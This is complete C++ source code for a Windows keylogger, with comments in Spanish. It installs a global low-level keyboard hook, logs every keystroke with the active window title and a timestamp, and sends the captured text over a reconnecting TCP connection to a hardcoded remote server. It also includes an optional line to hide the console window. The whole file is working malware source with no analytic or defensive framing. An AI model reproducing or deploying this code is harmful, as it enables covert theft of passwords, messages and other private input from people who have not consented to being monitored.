#include <iostream>
#include <vector>
#include <string>
#include <queue>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <fstream>
#include <time.h>
#include <map>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

// --- Configuración de Red ---
const char* SERVER_IP = "10.0.2.3";
const char* SERVER_PORT = "8080";

// --- Mapeo de Teclas Especiales (Referencia solicitada) ---
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"}, {VK_SPACE, " "},
    {VK_TAB, "[TAB]"}, {VK_SHIFT, "[SHIFT]"}, {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"}, {VK_CONTROL, "[CONTROL]"}, {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"}, {VK_MENU, "[ALT]"}, {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"}, {VK_HOME, "[HOME]"}, {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"}, {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"},
    {VK_CAPITAL, "[CAPSLOCK]"}
};

// --- Estado Global ---
std::queue<std::string> dataQueue;
std::mutex queueMtx;
std::condition_variable queueCv;
bool running = true;
HHOOK g_hook = nullptr;
char g_lastWindow[256] = "";

// --- Lógica de Formateo y Traducción ---
std::string ProcessKey(int key_stroke) {
    std::stringstream ss;
    HWND foreground = GetForegroundWindow();
    
    // 1. Detección de cambio de ventana
    if (foreground) {
        char window_title[256];
        GetWindowTextA(foreground, window_title, 256);
        if (strcmp(window_title, g_lastWindow) != 0) {
            strcpy_s(g_lastWindow, sizeof(g_lastWindow), window_title);
            
            time_t t = time(NULL);
            struct tm tm_info;
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%d %H:%M:%S", &tm_info);
            
            ss << "\n\n[Ventana: " << window_title << " - " << s << "]\n";
        }
    }

    // 2. Traducción de la tecla
    if (keyname.find(key_stroke) != keyname.end()) {
        ss << keyname.at(key_stroke);
    } else {
        // Lógica de mayúsculas/minúsculas
        bool capslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0 || 
                     (GetKeyState(VK_LSHIFT) & 0x8000) != 0 || 
                     (GetKeyState(VK_RSHIFT) & 0x8000) != 0;

        HKL layout = GetKeyboardLayout(GetWindowThreadProcessId(foreground, NULL));
        char key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        if (!(capslock ^ shift)) key = tolower(key);
        else key = toupper(key);
        
        ss << key;
    }
    return ss.str();
}

// --- Consumidor: Hilo de Red con Reconexión ---
void networkWorker() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    while (running) {
        struct addrinfo hints{}, *res = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &res) != 0) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
            freeaddrinfo(res);
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        freeaddrinfo(res);

        while (running) {
            std::string data;
            {
                std::unique_lock<std::mutex> lock(queueMtx);
                queueCv.wait_for(lock, std::chrono::milliseconds(500), [] { 
                    return !dataQueue.empty() || !running; 
                });
                if (!running && dataQueue.empty()) break;
                if (dataQueue.empty()) continue;
                data = dataQueue.front();
                dataQueue.pop();
            }

            if (send(sock, data.c_str(), (int)data.length(), 0) == SOCKET_ERROR) break;
        }
        closesocket(sock);
    }
    WSACleanup();
}

// --- Productor: Callback del Hook ---
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
        std::string formattedKey = ProcessKey(kbs->vkCode);
        
        if (!formattedKey.empty()) {
            std::lock_guard<std::mutex> lock(queueMtx);
            dataQueue.push(formattedKey);
            queueCv.notify_one();
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

int main() {
    // 1. Ocultar consola (Opcional, basado en tu referencia)
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 2. Iniciar consumidor
    std::thread netThread(networkWorker);

    // 3. Instalar Hook
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
    if (!g_hook) return 1;

    // 4. Bucle de mensajes
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    running = false;
    queueCv.notify_all();
    UnhookWindowsHookEx(g_hook);
    if (netThread.joinable()) netThread.join();

    return 0;
}
